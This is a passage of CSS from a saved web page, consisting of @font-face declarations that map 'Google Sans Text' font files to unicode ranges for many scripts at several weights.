                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFN2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0B01-0B77, U+1CDA, U+1CF2, U+200C-200D, U+20B9, U+25CC;
            }
            /* sinhala */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFd2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0D81-0DF4, U+1CF2, U+200C-200D, U+25CC, U+111E1-111F4;
            }
            /* symbols */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qCR2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* tamil */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFx2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0B82-0BFA, U+200C-200D, U+20B9, U+25CC;
            }
            /* telugu */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFZ2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C00-0C7F, U+1CDA, U+1CF2, U+200C-200D, U+25CC;
            }
            /* thai */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qF52i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+02D7, U+0303, U+0331, U+0E01-0E5B, U+200C-200D, U+25CC;
            }
            /* vietnamese */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEV2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qER2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEp2iw.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* armenian */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnhjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0308, U+0530-058F, U+2010, U+2024, U+25CC, U+FB13-FB17;
            }
            /* bengali */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnpjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0980-09FE, U+1CD0, U+1CD2, U+1CD5-1CD6, U+1CD8, U+1CE1,
                    U+1CEA, U+1CED, U+1CF2, U+1CF5-1CF7, U+200C-200D, U+20B9, U+25CC, U+A8F1;
            }
            /* canadian-aboriginal */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnkdjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+02C7, U+02D8-02D9, U+02DB, U+0307, U+1400-167F, U+18B0-18F5, U+25CC, U+11AB0-11ABF;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmVjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmxjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* devanagari */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmljtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0900-097F, U+1CD0-1CF9, U+200C-200D, U+20A8, U+20B9, U+20F0, U+25CC, U+A830-A839,
                    U+A8E0-A8FF, U+11B00-11B09;
            }
            /* ethiopic */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnljtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+030E, U+1200-1399, U+2D80-2DDE, U+AB01-AB2E, U+1E7E0-1E7E6, U+1E7E8-1E7EB,
                    U+1E7ED-1E7EE, U+1E7F0-1E7FE;
            }
            /* georgian */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnndjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0589, U+10A0-10FF, U+1C90-1CBA, U+1CBD-1CBF, U+205A, U+2D00-2D2F, U+2E31;
            }
            /* greek-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmRjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmtjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* gujarati */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnNjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A80-0AFF, U+200C-200D, U+20B9, U+25CC, U+A830-A839;
            }
            /* gurmukhi */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnktjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A01-0A76, U+200C-200D, U+20B9, U+25CC, U+262C, U+A830-A839;
            }
            /* hebrew */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmpjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0307-0308, U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* kannada */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnJjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C80-0CF3, U+1CD0, U+1CD2-1CD3, U+1CDA, U+1CF2, U+1CF4,
                    U+200C-200D, U+20B9, U+25CC, U+A830-A835;
            }
            /* khmer */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmNjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+1780-17FF, U+19E0-19FF, U+200C-200D, U+25CC;
            }
            /* lao */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmFjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0E81-0EDF, U+200C-200D, U+25CC;
            }
            /* malayalam */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnBjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0307, U+0323, U+0951-0952, U+0964-0965, U+0D00-0D7F, U+1CDA, U+1CF2, U+200C-200D,
                    U+20B9, U+25CC, U+A830-A832;
            }
            /* oriya */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnFjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0B01-0B77, U+1CDA, U+1CF2, U+200C-200D, U+20B9, U+25CC;
            }
            /* sinhala */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnVjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0D81-0DF4, U+1CF2, U+200C-200D, U+25CC, U+111E1-111F4;
            }
            /* symbols */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVngZjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* tamil */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnn5jtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0B82-0BFA, U+200C-200D, U+20B9, U+25CC;
            }
            /* telugu */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnRjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C00-0C7F, U+1CDA, U+1CF2, U+200C-200D, U+25CC;
            }
            /* thai */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnnxjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+02D7, U+0303, U+0331, U+0E01-0E5B, U+200C-200D, U+25CC;
            }
            /* vietnamese */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmdjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmZjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oLlVnmhjtg.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* armenian */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnhjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0308, U+0530-058F, U+2010, U+2024, U+25CC, U+FB13-FB17;
            }
            /* bengali */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnpjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0980-09FE, U+1CD0, U+1CD2, U+1CD5-1CD6, U+1CD8, U+1CE1,
                    U+1CEA, U+1CED, U+1CF2, U+1CF5-1CF7, U+200C-200D, U+20B9, U+25CC, U+A8F1;
            }
            /* canadian-aboriginal */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnkdjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+02C7, U+02D8-02D9, U+02DB, U+0307, U+1400-167F, U+18B0-18F5, U+25CC, U+11AB0-11ABF;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmVjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmxjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* devanagari */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmljtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0900-097F, U+1CD0-1CF9, U+200C-200D, U+20A8, U+20B9, U+20F0, U+25CC, U+A830-A839,
                    U+A8E0-A8FF, U+11B00-11B09;
            }
            /* ethiopic */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnljtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+030E, U+1200-1399, U+2D80-2DDE, U+AB01-AB2E, U+1E7E0-1E7E6, U+1E7E8-1E7EB,
                    U+1E7ED-1E7EE, U+1E7F0-1E7FE;
            }
            /* georgian */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnndjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0589, U+10A0-10FF, U+1C90-1CBA, U+1CBD-1CBF, U+205A, U+2D00-2D2F, U+2E31;
            }
            /* greek-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmRjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmtjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* gujarati */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnNjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A80-0AFF, U+200C-200D, U+20B9, U+25CC, U+A830-A839;
            }
            /* gurmukhi */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnktjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A01-0A76, U+200C-200D, U+20B9, U+25CC, U+262C, U+A830-A839;
            }
            /* hebrew */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmpjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0307-0308, U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* kannada */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnJjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C80-0CF3, U+1CD0, U+1CD2-1CD3, U+1CDA, U+1CF2, U+1CF4,
                    U+200C-200D, U+20B9, U+25CC, U+A830-A835;
            }
            /* khmer */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmNjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+1780-17FF, U+19E0-19FF, U+200C-200D, U+25CC;
            }
            /* lao */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmFjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0E81-0EDF, U+200C-200D, U+25CC;
            }
            /* malayalam */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnBjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0307, U+0323, U+0951-0952, U+0964-0965, U+0D00-0D7F, U+1CDA, U+1CF2, U+200C-200D,
                    U+20B9, U+25CC, U+A830-A832;
            }
            /* oriya */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnFjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0B01-0B77, U+1CDA, U+1CF2, U+200C-200D, U+20B9, U+25CC;
            }
            /* sinhala */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnVjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0D81-0DF4, U+1CF2, U+200C-200D, U+25CC, U+111E1-111F4;
            }
            /* symbols */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTngZjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
